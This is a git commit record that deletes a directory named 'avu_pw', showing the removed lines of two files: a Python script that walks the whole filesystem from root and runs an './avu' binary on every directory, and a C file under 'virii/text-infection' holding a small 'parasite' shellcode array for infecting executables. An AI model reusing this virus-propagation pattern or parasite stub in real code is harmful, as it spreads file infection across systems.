fa7327f7f276adb2eb306bb1c89d6a28ae9c4709
ee223 <38060611+ee223@users.noreply.github.com>
2025-07-22 16:59:44 +0800

    Delete avu_pw directory

--- avu_pw/avu.py
+++
@@ -1,9 +0,0 @@
-#!/usr/bin/python
-import os
-import subprocess
-for root, dirs, files in os.walk("/", topdown=False):
-    for name in dirs:
-    	subprocess.call(["./avu", root])
-
-
-
--- avu_pw/virii/text-infection/p.c
+++
@@ -1,6 +0,0 @@
-int return_entry_start = 1;
-
-char parasite[] =
-	"\xb8\x00\x00\x00\x00"      
-	"\xff\xe0"                  
-;
